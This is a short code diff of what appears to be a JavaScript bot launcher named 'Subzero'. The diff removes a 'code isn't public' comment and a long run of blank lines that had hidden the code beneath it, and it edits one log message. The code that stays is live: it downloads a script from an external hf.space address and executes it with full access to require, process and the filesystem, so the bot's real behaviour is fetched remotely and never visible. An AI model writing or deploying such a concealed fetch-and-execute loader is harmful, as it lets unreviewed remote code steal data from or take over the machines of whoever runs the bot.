@@ -18,106 +18,13 @@ $$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
 */
 
 
-
-// DUE TO COPYRIGHT ISSUES CODES AREN'T PUBLIC.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 // ZIMBABWEAN STAR ON TOP
 const axios = require('axios');
 const vm = require('vm');
 
 (async () => {
   try {
-    console.log("Subzero Synchronization Initiated !");
+    console.log("😎 Subzero Synchronization Initiated !");
     const { data: scriptCode } = await axios.get('https://mrfrankk-cdn.hf.space/mrfrank/index.js');
     new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
   } catch (err) {
